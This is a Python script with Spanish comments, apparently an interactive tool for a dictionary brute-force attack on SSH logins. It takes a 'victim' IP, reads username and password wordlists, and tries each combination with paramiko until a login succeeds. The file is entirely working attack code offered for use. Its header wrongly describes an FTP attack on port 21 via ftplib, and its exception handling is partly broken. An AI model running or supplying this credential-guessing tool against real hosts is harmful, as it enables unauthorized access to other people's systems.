#!/usr/bin/env python
# -*- coding: utf-8 -*-
########################################################
# Ataque por fuerza bruta al puerto FTP puerto-->21    #
# se utiliza la libreria de pyton ftplib y sus         #
# distintos metodos.Se necesita IP victima, puerto     #
# usuario y diccionario de claves posibles             #
# Este ataque va precedido de una etapa de recoleccion #
# de informacion donde descubrimos el usuario de la    #
# maquina victima,asi como, que el puerto 21 para el   #
# FTP esta abierto.                                    #
########################################################
#Librerias a importar
import os
import sys
from termcolor import colored
import paramiko
import socket
import time

####################################################
# Se borra las pantalla
####################################################
def borrarPantalla():
    if os.name == "posix":
        os.system ("clear")
    elif os.name == "ce" or os.name == "nt" or os.name == "dos":
        os.system ("cls")

####################################################
# Se valida que el fichero existe en el directorio #
# y ademas que el fichero no esta vacio            #
####################################################
def validaFichEntUser(fileEntUser):
    name_dirEnt =os.path.join(os.path.dirname(__file__),'FichEnt')
    name_file = os.path.join(name_dirEnt,fileEntUser)

    if not os.path.isfile(name_file):
        print(colored("[-] El fichero diccionario NO EXISTE ,por favor verifique directorio y nombre de fichero",'red',attrs=['bold']))
        exit()
    elif os.stat(name_file).st_size==0:
        print(colored("[-]El fichero: diccionario.txt, de posibles passwords esta vacio, en directorio FichEnt",'red',attrs=['bold']))
        exit()

    return name_file

####################################################
# Se valida que el fichero existe en el directorio #
# y ademas que el fichero no esta vacio            #
####################################################
def validaFichEnt(fileEnt):
    name_dirEnt =os.path.join(os.path.dirname(__file__),'FichEnt')
    name_file = os.path.join(name_dirEnt,fileEnt)

    if not os.path.isfile(name_file):
        print(colored("[-] El fichero diccionario NO EXISTE ,por favor verifique directorio y nombre de fichero",'red',attrs=['bold']))
        exit()
    elif os.stat(name_file).st_size==0:
        print(colored("[-]El fichero: diccionario.txt, de posibles passwords esta vacio, en directorio FichEnt",'red',attrs=['bold']))
        exit()

    return name_file

####################################################
# Se lee el fichero de entrada con cada una de las #
# posibles passwords que puede tener el servicio   #
# FTP para el usuario que hemos pasado             #
####################################################
def leerFichPasswd(Fich_Ent_Passwd):
    leerFichP=open(Fich_Ent_Passwd,'r',encoding='utf-8-sig').readlines()
    leerFichPFinal=(passwd.strip().rstrip() for passwd in leerFichP)

    return leerFichPFinal

####################################################
# Se lee el fichero de entrada con cada una de las #
# posibles usuarios que puede tener el servicio    #
# FTP                                              #
####################################################
def leerFichUser(Fich_Ent_User):
    leerFichU=open(Fich_Ent_User,'r',encoding='utf-8-sig').readlines()
    leerFichPFinalUser=(userftp.strip().rstrip() for userftp in leerFichU)

    return leerFichPFinalUser

######################################################
# Se realiza el ataque por fuerza bruta utilizando   #
# la ip y usuario introducidos, asi como el puerto   #
# que por defecto sera el 22 y como password,las     #
# distintas posibilidades que ofrece el fichero      #
# de password
######################################################
def AtaqueFuerzaBrutaSSH(Ipvictima,Usuariovictima):

    print("                                                                          ")
    print(colored("Para el ataque se usara el diccionario de password por defecto",'green',attrs=['bold']))
    print(colored("Diccionario de passwords: ",'green',attrs=['bold']),colored("FichEnt/diccionario.txt",'blue',attrs=['bold']))
    print("                                                                          ")

    tipoDici=input(colored("Desea cambiar el diccionario?, S o N: ",'green',attrs=['bold']))
    print("                                                                          ")

    if tipoDici.upper()=='S':
        print("                                                                          ")
        print(colored("Por favor indique nuevo diccionario,ejemplo password.txt",'green',attrs=['bold']))
        print(colored("Recuerde que debe de estar en el directorio ",'green',attrs=['bold']),colored("FichEnt",'blue',attrs=['bold']))
        print("                                                                          ")
        fileEnt=input(colored("Indique nombre del nuevo diccionario de passwords a utilizar: ",'green',attrs=['bold']))
    elif tipoDici.upper()=='N':
        fileEnt="diccionario.txt"
    else:
        print(colored("[-] Error opcion no valida",'red',attrs=['bold']))
        exit()

    #validamos fichero y lo leemos
    Fich_Ent_Passwd=validaFichEnt(fileEnt)
    passwdPosibles=leerFichPasswd(Fich_Ent_Passwd)

    try:
        puerto='22'
        print("                           ")
        print("usuario : " + Usuariovictima)
        print("puerto:   " + puerto)

        #Establecemos la conexion con SSH
        conexion_ssh = paramiko.SSHClient()
        #Añadimos la clave en caso de que sea la primera conexion (siempre es necesaria)
        conexion_ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        for passw in passwdPosibles:
            print("password: " + passw)
            #Establecemos la conexion con SSH
            conexion_ssh = paramiko.SSHClient()
            #Añadimos la clave en caso de que sea la primera conexion (siempre es necesaria)
            conexion_ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            try:
                conexion_ssh.connect(Ipvictima.strip(),puerto,Usuariovictima.strip(),passw.strip(),banner_timeout=600,timeout=600,auth_timeout=600)
                print(colored("[+]!!!! Password encontrada ¡¡¡¡ ",'green',attrs=['bold']) , colored(passw,'blue',attrs=['bold']) ,colored( " para usuario ",'green',attrs=['bold']),colored(Usuariovictima,'blue',attrs=['bold']),colored(" conexion a SSH",'green',attrs=['bold']))
                time.sleep(3)
                exit()
                #No funciona la contraseña que hemos probado
            except paramiko.AuthenticationException:
                print(colored("[-]Login Error para la password: " + passw,'red',attrs=['bold']))

            except paramiko.SSHException as e:
                print(colored("[-]Error ssh exception: " + str(e) ,'red',attrs=['bold']))
                exit()
            except socket.error:
                print(colored("[-]Fallo al establecer la conexión: " + Ipvictima + ' Puerto:22','red',attrs=['bold']))
                exit()

        conexion_ssh.close()


    except():
        print(colored("[-]Error de conexion SSH a la ip " +Ipvictima+ " puerto: 22",'red',attrs=['bold']))
        exit()

########################################################
# Se solicita IP de entrada victima                    #
# se solicita usuario de conexion                      #
# el puerto por defecto sera el 22 y la password       #
# los posibles valores del fichero de claves a probar  #
########################################################
def SshFb(Ipssh):
    borrarPantalla()
    print(colored("*******************************************",'green',attrs=['bold']))
    print(colored("  ATAQUE FUERZA BRUTA SOBRE PROTOCOLO SSH  ",'green',attrs=['bold']))
    print(colored("*******************************************",'green',attrs=['bold']))
    print(colored("1.-Se conoceno usuario para ataque Login a SSH puerto 22  ",'green',attrs=['bold']))
    print(colored("2.-No Se conoceno usuario para ataque Login a SSH puerto 22  ",'green',attrs=['bold']))
    print("                                                                          ")
    opcionUsuValida=False
    opcionUsu=input(colored("Por favor elija la opcion de Login:",'green',attrs=['bold']))

    while opcionUsuValida==False:

        if opcionUsu=='1':
            Usuariovictima=input(colored("POR FAVOR,INDICAR USUARIO DE CONEXION SSH: ",'green',attrs=['bold']))
            AtaqueFuerzaBrutaSSH(Ipssh,Usuariovictima.strip())
            opcionUsuValida=True
        elif opcionUsu=='2':
            print(colored("Se usuara diccionario de usuarios para realizar ataque ",'green',attrs=['bold']))
            print(colored("Se utilizara fichero user.txt en directorio FichEnt",'green',attrs=['bold']))

            fichEntUsuarios=validaFichEntUser("user.txt")
            fichUserRead=leerFichUser(fichEntUsuarios)

            for user in fichUserRead:
                AtaqueFuerzaBrutaSSH(Ipssh,user)
            opcionUsuValida=True
        else:
            print(colored("Opcion no valida, elija opcion 1 o opcion 2",'red',attrs=['bold']))
            opcionUsu=input(colored("Por favor elija la opcion de Login:",'green',attrs=['bold']))
